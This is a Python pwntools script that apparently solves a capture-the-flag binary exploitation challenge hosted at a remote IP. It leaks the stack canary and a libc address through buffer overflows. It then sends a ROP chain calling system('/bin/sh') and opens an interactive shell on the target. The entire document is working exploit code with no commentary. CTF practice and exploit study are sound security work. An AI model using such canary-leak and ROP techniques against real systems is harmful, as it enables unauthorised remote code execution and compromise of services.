from pwn import *
context.binary = "./chall"
#p = process()
p = remote("45.153.243.57",1337)
script = """
b*main+146
b*main+210
b*main+266
c
"""
#gdb.attach(p,script)
p.recv()
p.sendline(b'1337')
time.sleep(0.3)
p.recv()
p.sendline(cyclic(72))
time.sleep(0.3)
p.recvline()
p.recv(72)
leak_canary = u64(p.recv(8).ljust(8,b'\x00')) - 0xa
log.info("Leak canary: %s", hex(leak_canary))
print(p.recv())
p.sendline(b'1337')

p.recv()
p.sendline(b'1337')
time.sleep(0.3)

p.recv()
p.sendline(cyclic(0x58-1))
#p.interactive()
time.sleep(0.3)
p.recvline()
p.recv(87)
leak_libc = u64(p.recv(8).strip(b'\n').ljust(8,b'\x00'))
#p.interactive()
libc_base = leak_libc -0x1d90
sys_func = leak_libc + 0x26fd0
bin_sh = leak_libc + 0x1ae908
pop_rdi = libc_base + 0x23e5
log.info("Leak_libc: %s", hex(leak_libc))
p.recv()
p.sendline(b'1337')

p.recv()

p.sendline(b'1337')
payload = b'A'*72 + p64(leak_canary) + b'B'*8+ p64(pop_rdi+1) + p64(pop_rdi) + p64(bin_sh) + p64(sys_func)
p.recv()
p.sendline(payload)
p.recv()
p.sendline(b'0')
p.interactive()
